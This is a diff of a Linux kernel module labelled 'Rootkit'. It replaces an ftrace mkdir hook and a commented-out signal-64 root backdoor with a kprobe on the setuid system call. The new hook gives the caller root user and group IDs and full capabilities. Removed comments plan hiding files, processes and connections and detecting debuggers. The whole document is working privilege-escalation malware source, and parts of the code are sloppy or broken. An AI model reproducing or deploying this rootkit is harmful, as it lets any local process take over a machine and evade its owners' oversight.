@@ -1,116 +1,81 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/syscalls.h>
-#include <linux/kallsyms.h>
-#include <linux/version.h>
-#include <linux/namei.h>
+#include <linux/capability.h>
+#include <linux/sched.h>
+#include <linux/kprobes.h>
+#include <linux/atomic.h>
 
-#include "ftrace_helper.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("otitoko");
 MODULE_DESCRIPTION("Rootkit");
 MODULE_VERSION("0.1");
 
-#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
-#define PTREGS_SYSCALL_STUBS 1
-#endif
+atomic_t hooked = ATOMIC_INIT(0);
 
-#ifdef PTREGS_SYSCALL_STUBS
-static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
-//hide file
-//hide network connections/ports
-//hide processes
-//gpu self healing
-//debugger detection
-//
+#define MAGIC_UID 50
 
+#define _GLOBAL_ROOT_UID 0
+#define _GLOBAL_ROOT_GID 0
 
+void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsigned long flags)
+{
+    printk(KERN_INFO "setuid hook called, elevating privs...");
 
-/*asmlinkage long (*orig_kill)(const struct pt_regs *);
+    struct cred *new_creds = prepare_creds();
 
+    /* uid privesc */
+    new_creds->uid.val=_GLOBAL_ROOT_UID;
+    new_creds->euid.val=_GLOBAL_ROOT_UID;
+    new_creds->suid.val=_GLOBAL_ROOT_UID;
+    new_creds->fsuid.val=_GLOBAL_ROOT_UID;
 
-void set_root(void){
-	struct cred *root;
+    /* gid privesc */
+    new_creds->gid.val=_GLOBAL_ROOT_GID;
+    new_creds->egid.val=_GLOBAL_ROOT_GID;
+    new_creds->sgid.val=_GLOBAL_ROOT_GID;
+    new_creds->fsgid.val=_GLOBAL_ROOT_GID;
 
-	root=prepare_creds();
-
-	if(root==NULL)
-		return;
-
-	root->uid.val=root->gid.val=0;
-	root->euid.val=root->egid.val=0;
-	root->suid.val=root->sgid.val=0;
-	root->fsuid.val=root->fsgid.val=0;
-
-	commit_creds(root);
+    /* capabilities privesc */
+    new_creds->cap_inheritable=CAP_FULL_SET;
+    new_creds->cap_permitted=CAP_FULL_SET;
+    new_creds->cap_effective=CAP_FULL_SET;
+    new_creds->cap_bset=CAP_FULL_SET;
+    commit_creds(new_creds);
 }
 
-asmlinkage int hooked_kill(const struct pt_regs *regs){
-	void set_root(void)
-
-		int sig = regs->si;
-
-	if(sig==64){
-		printk(KERN_INFO "rootkit has gained root\n");
-		set_root();
-		return 0;
-	}
-
-	return orig_kill(regs);
-}
-
-
-static struct ftrace_hook hooks[]={HOOK("__x64_sys_kill", hooked_kill, &orig_kill)};
-*/
-
-asmlinkage int hook_mkdir(const struct pt_regs *){
-	char __user *pathname = (char *)regs->di;
-	char dir_name[NAME_MAX] = {0};
-
-	long error =strncpy_from_user(dir_name, pathname, NAME_MAX);
-	if(error>0)
-		printk(KERN_INFO "rootkit creating dir with anem %s\n",dir_name);
-
-	orig_mkdir(regs);
-	return 0;
-}
-#else
-static asmlinkage long (*orig_mkdir)(const char __user *pathname, umode_t mode);
-
-asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
-	char dir_name[NAME_MAX]={0};
-	long error = strncpy_from_user(dir_name, pathname,NAME_MAX);
-
-	if(error>0)
-		printk(KERN_INFO "rootkit creating dir with anem %s\n",dir_name);
-	orig_mkdir(pathname,mode);
-	return 0;
-}
-#endif
-
-static struct ftrace_hook hooks[] = {
-	HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
+struct kprobe __x64_sys_setuid_hook = {
+        .symbol_name = "__x64_sys_setuid",
+        .post_handler = __x64_sys_setuid_post_handler,
 };
-static int __init basic_init(void){
 
-	int err;
-	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
-	if(err)
-		return err;
-
-	printk(KERN_INFO"rootkit loaded\n");
+static int __init rkin(void)
+{
+    printk(KERN_INFO "module loaded\n");
+    int registered = register_kprobe(&__x64_sys_setuid_hook);
+    if (registered < 0)
+    {
+        printk(KERN_INFO "failed to register kprobe\n");
+    }
+    else
+    {
+        printk(KERN_INFO "hooked\n");
+        atomic_inc(&hooked);
+    }
 
     return 0;
 }
 
-static void __exit basic_exit(void){
-	fh_remove_hooks(hooks,ARRAY_SIZE(hooks));
-
-	printk(KERN_INFO"rootkit unloaded\n");
+static void __exit rkout(void)
+{
+    if (atomic_read(&hooked))
+    {
+        unregister_kprobe(&__x64_sys_setuid_hook);
+        printk(KERN_INFO "unhooked\n");
+    }
 }
 
+module_init(rkin);
+module_exit(rkout);
 
-module_init(basic_init);
-module_exit(basic_exit);
